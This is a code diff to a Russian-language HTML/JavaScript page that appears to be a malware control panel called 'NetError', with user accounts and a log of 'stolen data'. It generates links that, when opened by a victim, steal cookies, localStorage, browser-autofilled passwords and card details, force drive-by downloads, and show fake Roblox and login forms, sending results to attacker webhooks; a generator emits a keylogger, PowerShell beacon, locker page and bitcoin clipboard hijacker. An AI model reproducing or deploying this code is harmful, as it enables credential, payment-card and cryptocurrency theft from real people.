@@ -171,7 +171,7 @@
             margin: 20px 0;
         }
 
-        /* Табы и карточки (все стили сохранены) */
+        /* Табы и карточки */
         .tabs {
             display: flex;
             flex-wrap: wrap;
@@ -465,128 +465,166 @@ start calc.exe</textarea>
 
     function loadUsers() {
         const raw = localStorage.getItem('neterror_users');
-        users = raw ? JSON.parse(raw) : [];
+        if (raw) {
+            users = JSON.parse(raw);
+        } else {
+            users = [];
+            saveUsers();
+        }
     }
-    function saveUsers() { localStorage.setItem('neterror_users', JSON.stringify(users)); }
+    function saveUsers() {
+        localStorage.setItem('neterror_users', JSON.stringify(users));
+    }
     function registerUser(email, pass) {
-        if(users.find(u=>u.email===email)) return {ok:false, msg:"Email уже существует"};
-        const id = Date.now()+'_'+Math.random().toString(36);
-        users.push({email, password: pass, id});
+        if (!email || !pass) return { ok: false, msg: "Заполните все поля" };
+        if (users.find(u => u.email === email)) return { ok: false, msg: "Email уже существует" };
+        const id = Date.now() + '_' + Math.random().toString(36);
+        users.push({ email, password: pass, id });
         saveUsers();
-        return {ok:true};
+        return { ok: true };
     }
     function loginUser(email, pass) {
-        const u = users.find(u=>u.email===email && u.password===pass);
-        return u ? {ok:true, user:u} : {ok:false, msg:"Неверный логин или пароль"};
+        const user = users.find(u => u.email === email && u.password === pass);
+        if (user) return { ok: true, user };
+        return { ok: false, msg: "Неверный логин или пароль" };
     }
     function getStolenData(userId) {
-        const key = 'neterror_stolen_'+userId;
+        const key = 'neterror_stolen_' + userId;
         const raw = localStorage.getItem(key);
         return raw ? JSON.parse(raw) : [];
     }
     function addStolenEntry(userId, entry) {
-        const key = 'neterror_stolen_'+userId;
+        const key = 'neterror_stolen_' + userId;
         const logs = getStolenData(userId);
-        logs.unshift({...entry, timestamp: new Date().toISOString()});
-        while(logs.length>500) logs.pop();
+        logs.unshift({ ...entry, timestamp: new Date().toISOString() });
+        while (logs.length > 500) logs.pop();
         localStorage.setItem(key, JSON.stringify(logs));
     }
 
     function refreshAuthUI() {
-        const unauth = document.getElementById('unauthPanel');
-        const auth = document.getElementById('authPanel');
-        if(currentUser) {
-            unauth.style.display = 'none';
-            auth.style.display = 'block';
+        const unauthPanel = document.getElementById('unauthPanel');
+        const authPanel = document.getElementById('authPanel');
+        if (currentUser) {
+            unauthPanel.style.display = 'none';
+            authPanel.style.display = 'block';
             document.getElementById('currentUserEmail').innerText = currentUser.email;
             updateStatsBadge();
             renderLogs();
         } else {
-            unauth.style.display = 'flex';
-            auth.style.display = 'none';
+            unauthPanel.style.display = 'flex';
+            authPanel.style.display = 'none';
         }
     }
     function updateStatsBadge() {
-        if(currentUser) document.getElementById('statsBadge').innerText = getStolenData(currentUser.id).length + ' логов';
+        if (currentUser) {
+            const count = getStolenData(currentUser.id).length;
+            document.getElementById('statsBadge').innerText = count + ' логов';
+        }
     }
     function renderLogs() {
-        if(!currentUser) return;
+        if (!currentUser) return;
         const logs = getStolenData(currentUser.id);
         const container = document.getElementById('stolenLogsContainer');
-        if(!logs.length) { container.innerHTML = '<p class="note-red">Нет украденных данных</p>'; return; }
+        if (!logs.length) {
+            container.innerHTML = '<p class="note-red">Нет украденных данных</p>';
+            return;
+        }
         let html = `<table class="logs-table"><thead><tr><th>Время</th><th>Тип</th><th>Данные</th></tr></thead><tbody>`;
         logs.forEach(log => {
             let dataStr = '';
-            if(log.type === 'stealth_full') dataStr = `🔑 Пароли: ${log.passwords||'нет'}, Куки: ${log.cookies_count||0}, IP: ${log.ip||'?'}`;
-            else if(log.type === 'card_stealer') dataStr = `💳 ${log.card_data || JSON.stringify(log.cards)}`;
-            else if(log.type === 'driveby_download') dataStr = `📁 Скачан файл: ${log.filename}`;
-            else if(log.type === 'roblox_creds') dataStr = `Roblox: ${log.username}/${log.password}`;
-            else if(log.type === 'form_creds') dataStr = `Логин: ${log.creds?.login} Пароль: ${log.creds?.pass}`;
-            else if(log.type === 'ip_grab') dataStr = `IP: ${log.ip} Geo: ${log.geo?.city||''}`;
+            if (log.type === 'stealth_full') dataStr = `🔑 Пароли: ${log.passwords || 'нет'}, Куки: ${log.cookies_count || 0}, IP: ${log.ip || '?'}`;
+            else if (log.type === 'card_stealer') dataStr = `💳 ${log.card_data || JSON.stringify(log.cards)}`;
+            else if (log.type === 'driveby_download') dataStr = `📁 Скачан файл: ${log.filename}`;
+            else if (log.type === 'roblox_creds') dataStr = `Roblox: ${log.username}/${log.password}`;
+            else if (log.type === 'form_creds') dataStr = `Логин: ${log.creds?.login} Пароль: ${log.creds?.pass}`;
+            else if (log.type === 'ip_grab') dataStr = `IP: ${log.ip} Geo: ${log.geo?.city || ''}`;
             else dataStr = JSON.stringify(log);
             html += `<tr><td>${new Date(log.timestamp).toLocaleString()}</td><td>${log.type}</td><td style="word-break:break-word;">${escapeHtml(String(dataStr))}</td></tr>`;
         });
         html += `</tbody></table>`;
         container.innerHTML = html;
     }
-    function escapeHtml(str) { return str.replace(/[&<>]/g, function(m){if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
+    function escapeHtml(str) {
+        return str.replace(/[&<>]/g, function (m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
 
-    // Переключение форм логин/регистрация
-    const loginFormDiv = document.getElementById('loginForm');
-    const registerFormDiv = document.getElementById('registerForm');
+    // Переключение форм
+    const loginDiv = document.getElementById('loginForm');
+    const registerDiv = document.getElementById('registerForm');
     const formTitle = document.getElementById('formTitle');
     document.getElementById('showRegister').addEventListener('click', () => {
-        loginFormDiv.style.display = 'none';
-        registerFormDiv.style.display = 'block';
+        loginDiv.style.display = 'none';
+        registerDiv.style.display = 'block';
         formTitle.innerText = '📝 РЕГИСТРАЦИЯ';
         document.getElementById('authMsg').innerHTML = '';
     });
     document.getElementById('showLogin').addEventListener('click', () => {
-        registerFormDiv.style.display = 'none';
-        loginFormDiv.style.display = 'block';
+        registerDiv.style.display = 'none';
+        loginDiv.style.display = 'block';
         formTitle.innerText = '🔐 АВТОРИЗАЦИЯ';
         document.getElementById('authMsg').innerHTML = '';
     });
 
+    // Регистрация
     document.getElementById('registerBtn').addEventListener('click', () => {
         const email = document.getElementById('regEmail').value.trim();
         const pass = document.getElementById('regPass').value;
-        if(!email || !pass) { showAuthMsg('Заполните все поля', true); return; }
+        const msgDiv = document.getElementById('authMsg');
+        if (!email || !pass) {
+            msgDiv.style.color = '#ff8888';
+            msgDiv.innerText = 'Заполните все поля';
+            return;
+        }
         const res = registerUser(email, pass);
-        if(res.ok) {
-            showAuthMsg('✅ Регистрация успешна! Теперь войдите.', false);
-            document.getElementById('showLogin').click();
+        if (res.ok) {
+            msgDiv.style.color = '#88ff88';
+            msgDiv.innerText = '✅ Регистрация успешна! Теперь войдите.';
+            // Очистить поля и переключить на логин
             document.getElementById('regEmail').value = '';
             document.getElementById('regPass').value = '';
+            document.getElementById('showLogin').click();
         } else {
-            showAuthMsg(res.msg, true);
+            msgDiv.style.color = '#ff8888';
+            msgDiv.innerText = res.msg;
         }
     });
+
+    // Логин
     document.getElementById('loginBtn').addEventListener('click', () => {
         const email = document.getElementById('loginEmail').value.trim();
         const pass = document.getElementById('loginPass').value;
+        const msgDiv = document.getElementById('authMsg');
+        if (!email || !pass) {
+            msgDiv.style.color = '#ff8888';
+            msgDiv.innerText = 'Введите email и пароль';
+            return;
+        }
         const res = loginUser(email, pass);
-        if(res.ok) {
+        if (res.ok) {
             currentUser = { email: res.user.email, id: res.user.id };
-            localStorage.setItem('neterror_current_session', JSON.stringify({id: currentUser.id, email: currentUser.email}));
+            localStorage.setItem('neterror_current_session', JSON.stringify({ id: currentUser.id, email: currentUser.email }));
             refreshAuthUI();
+            // Переключим активную вкладку на stealth
+            switchTab('stealth');
         } else {
-            showAuthMsg(res.msg, true);
+            msgDiv.style.color = '#ff8888';
+            msgDiv.innerText = res.msg;
         }
     });
-    function showAuthMsg(msg, isError) {
-        const msgDiv = document.getElementById('authMsg');
-        msgDiv.innerText = msg;
-        msgDiv.style.color = isError ? '#ff8888' : '#88ff88';
-        setTimeout(() => { if(msgDiv.innerText === msg) msgDiv.innerText = ''; }, 3000);
-    }
+
+    // Выход
     document.getElementById('logoutBtn').addEventListener('click', () => {
         currentUser = null;
         localStorage.removeItem('neterror_current_session');
         refreshAuthUI();
     });
 
-    // ---------- ГЕНЕРАЦИЯ ССЫЛОК ----------
+    // ---------- ГЕНЕРАЦИЯ ССЫЛОК (все функции) ----------
     function makeLink(params, ownerId) {
         const base = window.location.href.split('?')[0];
         params.set('owner', ownerId);
@@ -594,21 +632,23 @@ start calc.exe</textarea>
         return base + '?' + params.toString();
     }
 
+    // Stealth
     document.getElementById('generateStealthLink')?.addEventListener('click', () => {
-        if(!currentUser) return alert("Авторизуйтесь");
+        if (!currentUser) return alert("Авторизуйтесь");
         const redirect = document.getElementById('stealthRedirect').value.trim() || 'https://youtube.com';
         const extraWh = document.getElementById('stealthWebhook').value.trim();
         const params = new URLSearchParams();
         params.set('stealth', '1');
         params.set('redirect', redirect);
-        if(extraWh) params.set('extra_wh', extraWh);
+        if (extraWh) params.set('extra_wh', extraWh);
         const link = makeLink(params, currentUser.id);
         document.getElementById('stealthLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
         document.getElementById('stealthResult').style.display = 'block';
     });
 
+    // Drive-by
     document.getElementById('generateDrivebyLink')?.addEventListener('click', () => {
-        if(!currentUser) return alert("Войдите");
+        if (!currentUser) return alert("Авторизуйтесь");
         const filename = document.getElementById('drivebyFilename').value.trim() || 'payload.exe';
         const content = document.getElementById('drivebyContent').value;
         const redirect = document.getElementById('drivebyRedirect').value.trim() || 'https://google.com';
@@ -618,28 +658,30 @@ start calc.exe</textarea>
         params.set('filename', filename);
         params.set('content', btoa(unescape(encodeURIComponent(content))));
         params.set('redirect', redirect);
-        if(webhook) params.set('dw_wh', webhook);
+        if (webhook) params.set('dw_wh', webhook);
         const link = makeLink(params, currentUser.id);
         document.getElementById('drivebyLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
         document.getElementById('drivebyResult').style.display = 'block';
     });
 
+    // Card Stealer
     document.getElementById('generateCardLink')?.addEventListener('click', () => {
-        if(!currentUser) return alert("Авторизуйтесь");
+        if (!currentUser) return alert("Авторизуйтесь");
         const redirect = document.getElementById('cardRedirect').value.trim() || 'https://youtube.com';
         const wh = document.getElementById('cardWebhook').value.trim();
         const params = new URLSearchParams();
         params.set('cardsteal', '1');
         params.set('redirect', redirect);
-        if(wh) params.set('card_wh', wh);
+        if (wh) params.set('card_wh', wh);
         const link = makeLink(params, currentUser.id);
         document.getElementById('cardLinkSpan').innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
         document.getElementById('cardResult').style.display = 'block';
     });
 
+    // Фишинг
     document.getElementById('generateOwnScamLink')?.addEventListener('click', () => {
-        if(!currentUser) return;
-        const redirect = document.getElementById('ownerOriginalUrl').value;
+        if (!currentUser) return alert("Авторизуйтесь");
+        const redirect = document.getElementById('ownerOriginalUrl').value.trim() || 'https://roblox.com';
         const attack = document.getElementById('ownerAttackType').value;
         const params = new URLSearchParams();
         params.set('phish', attack);
@@ -649,55 +691,59 @@ start calc.exe</textarea>
         document.getElementById('ownerScamResult').style.display = 'block';
     });
 
-    // ---------- ОБРАБОТЧИКИ АТАК (ЖЕРТВА) ----------
+    // ---------- ОБРАБОТЧИКИ АТАК (на стороне жертвы) ----------
     (function handleAllAttacks() {
         const urlParams = new URLSearchParams(window.location.search);
         const ownerId = urlParams.get('owner');
-        if(!ownerId) return;
+        if (!ownerId) return;
         function sendToOwner(data, extraWebhook = null) {
             addStolenEntry(ownerId, data);
-            if(extraWebhook && extraWebhook.startsWith('http')) {
-                fetch(extraWebhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) }).catch(e=>console.log);
+            if (extraWebhook && extraWebhook.startsWith('http')) {
+                fetch(extraWebhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) }).catch(e => console.log);
             }
         }
         // STEALTH
-        if(urlParams.has('stealth')) {
+        if (urlParams.has('stealth')) {
             const redirect = urlParams.get('redirect') || 'https://google.com';
             const extraWh = urlParams.get('extra_wh') || null;
             (async () => {
                 const stolen = { type: 'stealth_full', url: location.href, userAgent: navigator.userAgent, cookies: document.cookie, localStorage: {}, passwords: [] };
-                for(let i=0;i<localStorage.length;i++) { let k = localStorage.key(i); stolen.localStorage[k] = localStorage.getItem(k); }
+                for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); stolen.localStorage[k] = localStorage.getItem(k); }
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.srcdoc = `<html><body><form><input type="text" name="user" autocomplete="username"><input type="password" name="pass" autocomplete="current-password"></form><script>setTimeout(()=>{let u=document.querySelector('input[autocomplete="username"]').value,p=document.querySelector('input[autocomplete="current-password"]').value;parent.postMessage({user:u,pass:p},'*');},200);<\/script></body></html>`;
                 document.body.appendChild(iframe);
                 const promise = new Promise(resolve => {
-                    window.addEventListener('message', e => { if(e.data && typeof e.data === 'object') resolve(e.data); iframe.remove(); });
+                    window.addEventListener('message', e => { if (e.data && typeof e.data === 'object') resolve(e.data); iframe.remove(); });
                     setTimeout(() => { iframe.remove(); resolve({}); }, 800);
                 });
                 const creds = await promise;
-                if(creds.user || creds.pass) stolen.passwords.push(`Автофиллинг: ${creds.user} / ${creds.pass}`);
+                if (creds.user || creds.pass) stolen.passwords.push(`Автофиллинг: ${creds.user} / ${creds.pass}`);
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const {ip} = await ipRes.json();
+                    const { ip } = await ipRes.json();
                     stolen.ip = ip;
-                    try { const geoRes = await fetch(`https://ipapi.co/${ip}/json/`); const geo = await geoRes.json(); stolen.geo = {city: geo.city, country: geo.country_name}; } catch(e) {}
-                } catch(e) { stolen.ip = 'unknown'; }
-                stolen.cookies_count = document.cookie.split(';').filter(c=>c.trim()).length;
+                    try {
+                        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                        const geo = await geoRes.json();
+                        stolen.geo = { city: geo.city, country: geo.country_name };
+                    } catch (e) { }
+                } catch (e) { stolen.ip = 'unknown'; }
+                stolen.cookies_count = document.cookie.split(';').filter(c => c.trim()).length;
                 sendToOwner(stolen, extraWh);
                 window.location.replace(redirect);
             })();
             return;
         }
         // DRIVE-BY
-        if(urlParams.has('driveby')) {
+        if (urlParams.has('driveby')) {
             const filename = urlParams.get('filename') || 'malware.exe';
             const contentBase64 = urlParams.get('content') || '';
             const redirect = urlParams.get('redirect') || 'https://google.com';
             const dwWh = urlParams.get('dw_wh') || null;
             let content = '';
-            try { content = decodeURIComponent(escape(atob(contentBase64))); } catch(e) { content = 'echo "Hacked"'; }
-            const blob = new Blob([content], {type: 'application/octet-stream'});
+            try { content = decodeURIComponent(escape(atob(contentBase64))); } catch (e) { content = 'echo "Hacked"'; }
+            const blob = new Blob([content], { type: 'application/octet-stream' });
             const link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
             link.download = filename;
@@ -705,71 +751,71 @@ start calc.exe</textarea>
             link.click();
             document.body.removeChild(link);
             URL.revokeObjectURL(link.href);
-            sendToOwner({ type: 'driveby_download', filename: filename, content_preview: content.substring(0,200), userAgent: navigator.userAgent }, dwWh);
+            sendToOwner({ type: 'driveby_download', filename: filename, content_preview: content.substring(0, 200), userAgent: navigator.userAgent }, dwWh);
             setTimeout(() => { window.location.replace(redirect); }, 150);
             return;
         }
         // CARD STEALER
-        if(urlParams.has('cardsteal')) {
+        if (urlParams.has('cardsteal')) {
             const redirect = urlParams.get('redirect') || 'https://google.com';
             const cardWh = urlParams.get('card_wh') || null;
             const stolenCards = { type: 'card_stealer', cards: [] };
             const allInputs = document.querySelectorAll('input');
             allInputs.forEach(inp => {
                 const val = inp.value;
-                if(!val) return;
-                const lower = (inp.name+inp.id+inp.placeholder).toLowerCase();
-                if(/^\d{16}$/.test(val) || /^\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}$/.test(val)) stolenCards.cards.push({type:'card_number', value:val});
-                if(/^\d{3,4}$/.test(val) && lower.includes('cvv')) stolenCards.cards.push({type:'cvv', value:val});
-                if(/^\d{2}\/\d{2,4}$/.test(val) && lower.includes('exp')) stolenCards.cards.push({type:'expiry', value:val});
+                if (!val) return;
+                const lower = (inp.name + inp.id + inp.placeholder).toLowerCase();
+                if (/^\d{16}$/.test(val) || /^\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}$/.test(val)) stolenCards.cards.push({ type: 'card_number', value: val });
+                if (/^\d{3,4}$/.test(val) && lower.includes('cvv')) stolenCards.cards.push({ type: 'cvv', value: val });
+                if (/^\d{2}\/\d{2,4}$/.test(val) && lower.includes('exp')) stolenCards.cards.push({ type: 'expiry', value: val });
             });
             const iframeCard = document.createElement('iframe');
             iframeCard.style.display = 'none';
             iframeCard.srcdoc = `<html><body><form><input name="ccnum" autocomplete="cc-number"><input name="exp" autocomplete="cc-exp"><input name="cvv" autocomplete="cc-csc"><input name="name" autocomplete="cc-name"></form><script>setTimeout(()=>{let n=document.querySelector('[autocomplete="cc-number"]').value,e=document.querySelector('[autocomplete="cc-exp"]').value,c=document.querySelector('[autocomplete="cc-csc"]').value,nm=document.querySelector('[autocomplete="cc-name"]').value;parent.postMessage({number:n,exp:e,cvv:c,name:nm},'*');},300);<\/script></body></html>`;
             document.body.appendChild(iframeCard);
             const cardPromise = new Promise(resolve => {
-                window.addEventListener('message', e => { if(e.data && e.data.number) resolve(e.data); iframeCard.remove(); });
+                window.addEventListener('message', e => { if (e.data && e.data.number) resolve(e.data); iframeCard.remove(); });
                 setTimeout(() => { iframeCard.remove(); resolve({}); }, 1000);
             });
             const autoCards = await cardPromise;
-            if(autoCards.number || autoCards.cvv) stolenCards.cards.push({ autofill: autoCards });
+            if (autoCards.number || autoCards.cvv) stolenCards.cards.push({ autofill: autoCards });
             sendToOwner(stolenCards, cardWh);
             window.location.replace(redirect);
             return;
         }
         // PHISHING
-        if(urlParams.has('phish')) {
+        if (urlParams.has('phish')) {
             const phishType = urlParams.get('phish');
             const redirect = urlParams.get('redirect') || 'https://google.com';
             document.body.innerHTML = '';
             document.body.style.background = '#0a0c17';
             function sendPhish(data) { addStolenEntry(ownerId, data); }
-            if(phishType === 'roblox') {
-                const div = document.createElement('div'); div.style.maxWidth='400px'; div.style.margin='10% auto'; div.style.background='#111'; div.style.padding='30px';
+            if (phishType === 'roblox') {
+                const div = document.createElement('div'); div.style.maxWidth = '400px'; div.style.margin = '10% auto'; div.style.background = '#111'; div.style.padding = '30px';
                 div.innerHTML = `<h2>Roblox вход</h2><input id="u" placeholder="Логин"><input id="p" type="password" placeholder="Пароль"><button id="btn">Войти</button>`;
                 document.body.appendChild(div);
-                document.getElementById('btn').onclick = () => { sendPhish({type:'roblox_creds', username: document.getElementById('u').value, password: document.getElementById('p').value}); div.innerHTML = '<p>Редирект...</p>'; setTimeout(()=> location.href=redirect, 1000); };
-            } else if(phishType === 'ip') {
-                fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>{ sendPhish({type:'ip_grab', ip:ip.ip}); document.body.innerHTML = `<h3>IP: ${ip.ip}</h3>`; setTimeout(()=> location.href=redirect, 2000); });
-            } else if(phishType === 'pass') {
+                document.getElementById('btn').onclick = () => { sendPhish({ type: 'roblox_creds', username: document.getElementById('u').value, password: document.getElementById('p').value }); div.innerHTML = '<p>Редирект...</p>'; setTimeout(() => location.href = redirect, 1000); };
+            } else if (phishType === 'ip') {
+                fetch('https://api.ipify.org?format=json').then(r => r.json()).then(ip => { sendPhish({ type: 'ip_grab', ip: ip.ip }); document.body.innerHTML = `<h3>IP: ${ip.ip}</h3>`; setTimeout(() => location.href = redirect, 2000); });
+            } else if (phishType === 'pass') {
                 const formDiv = document.createElement('div'); formDiv.innerHTML = `<form id="steal"><input name="login" placeholder="Логин"><input name="pass" placeholder="Пароль"><button type="submit">Отправить</button></form>`;
                 document.body.appendChild(formDiv);
-                document.getElementById('steal').onsubmit = (e) => { e.preventDefault(); const login = e.target.login.value, pass = e.target.pass.value; sendPhish({type:'form_creds', creds:{login,pass}}); formDiv.innerHTML = '<p>Редирект...</p>'; setTimeout(()=> location.href=redirect, 1000); };
-            } else if(phishType === 'multi') {
+                document.getElementById('steal').onsubmit = (e) => { e.preventDefault(); const login = e.target.login.value, pass = e.target.pass.value; sendPhish({ type: 'form_creds', creds: { login, pass } }); formDiv.innerHTML = '<p>Редирект...</p>'; setTimeout(() => location.href = redirect, 1000); };
+            } else if (phishType === 'multi') {
                 const container = document.createElement('div'); container.innerHTML = `<h3>Мульти</h3><input id="mu" placeholder="Логин"><input id="mp" placeholder="Пароль"><button id="mbtn">Отправить</button>`;
                 document.body.appendChild(container);
-                document.getElementById('mbtn').onclick = () => { sendPhish({type:'multi_roblox', username: document.getElementById('mu').value, password: document.getElementById('mp').value}); container.innerHTML = '<p>Редирект...</p>'; setTimeout(()=> location.href=redirect, 1000); };
+                document.getElementById('mbtn').onclick = () => { sendPhish({ type: 'multi_roblox', username: document.getElementById('mu').value, password: document.getElementById('mp').value }); container.innerHTML = '<p>Редирект...</p>'; setTimeout(() => location.href = redirect, 1000); };
             }
             return;
         }
     })();
 
-    // RAT ГЕНЕРАТОР
+    // RAT генератор
     function genMalware(name, type, wh) {
-        const safe = name.replace(/[^a-z0-9_]/gi,'_');
-        if(type==='powershell_rat') return `# ${safe}\n$wh="${wh}"\nInvoke-RestMethod -Uri $wh -Method Post -Body (@{name="${safe}"}|ConvertTo-Json)`;
-        if(type==='js_keylogger') return `// ${safe}\nlet k="";document.onkeydown=e=>{k+=e.key;if(k.length>30)fetch("${wh}",{method:"POST",body:k})};`;
-        if(type==='locker_html') return `<html><body style="background:black;color:red"><h1>${safe} LOCKER</h1><script>alert("LOCKED");<\/script></body></html>`;
+        const safe = name.replace(/[^a-z0-9_]/gi, '_');
+        if (type === 'powershell_rat') return `# ${safe}\n$wh="${wh}"\nInvoke-RestMethod -Uri $wh -Method Post -Body (@{name="${safe}"}|ConvertTo-Json)`;
+        if (type === 'js_keylogger') return `// ${safe}\nlet k="";document.onkeydown=e=>{k+=e.key;if(k.length>30)fetch("${wh}",{method:"POST",body:k})};`;
+        if (type === 'locker_html') return `<html><body style="background:black;color:red"><h1>${safe} LOCKER</h1><script>alert("LOCKED");<\/script></body></html>`;
         return `# ${safe} clipper\nAdd-Type -AssemblyName System.Windows.Forms\nwhile($true){$c=[System.Windows.Forms.Clipboard]::GetText();if($c-match"^1"){[System.Windows.Forms.Clipboard]::SetText("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")};Start-Sleep 2}`;
     }
     document.getElementById('generateRatCodeBtn').onclick = () => {
@@ -782,28 +828,48 @@ start calc.exe</textarea>
     };
     document.getElementById('copyCodeBtn').onclick = () => {
         const area = document.getElementById('generatedCodeArea');
-        area.select(); document.execCommand('copy'); alert('Код скопирован');
+        area.select();
+        document.execCommand('copy');
+        alert('Код скопирован');
     };
 
-    // ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК
+    // Переключение вкладок внутри панели
     const tabBtns = document.querySelectorAll('[data-logtab]');
-    const contentsMap = { stealth: 'stealthTab', driveby: 'drivebyTab', cardstealer: 'cardstealerTab', phish: 'phishTab', logs: 'logsTab', rat: 'ratTabContent' };
+    const contentsMap = {
+        stealth: 'stealthTab',
+        driveby: 'drivebyTab',
+        cardstealer: 'cardstealerTab',
+        phish: 'phishTab',
+        logs: 'logsTab',
+        rat: 'ratTabContent'
+    };
     function switchTab(tabId) {
-        Object.values(contentsMap).forEach(id => { const el = document.getElementById(id); if(el) el.style.display = 'none'; });
+        Object.values(contentsMap).forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.style.display = 'none';
+        });
         const active = document.getElementById(contentsMap[tabId]);
-        if(active) active.style.display = 'block';
-        tabBtns.forEach(btn => { if(btn.getAttribute('data-logtab') === tabId) btn.classList.add('active'); else btn.classList.remove('active'); });
-        if(tabId === 'logs' && currentUser) renderLogs();
+        if (active) active.style.display = 'block';
+        tabBtns.forEach(btn => {
+            if (btn.getAttribute('data-logtab') === tabId) btn.classList.add('active');
+            else btn.classList.remove('active');
+        });
+        if (tabId === 'logs' && currentUser) renderLogs();
     }
     tabBtns.forEach(btn => btn.addEventListener('click', () => switchTab(btn.getAttribute('data-logtab'))));
 
+    // Инициализация
     loadUsers();
     const savedSession = localStorage.getItem('neterror_current_session');
-    if(savedSession) {
-        try { const sess = JSON.parse(savedSession); const user = users.find(u=>u.id===sess.id && u.email===sess.email); if(user) currentUser = { email: user.email, id: user.id }; } catch(e) {}
+    if (savedSession) {
+        try {
+            const sess = JSON.parse(savedSession);
+            const user = users.find(u => u.id === sess.id && u.email === sess.email);
+            if (user) currentUser = { email: user.email, id: user.id };
+        } catch (e) { }
     }
     refreshAuthUI();
-    if(currentUser) switchTab('stealth');
+    if (currentUser) switchTab('stealth');
 </script>
 </body>
 </html>
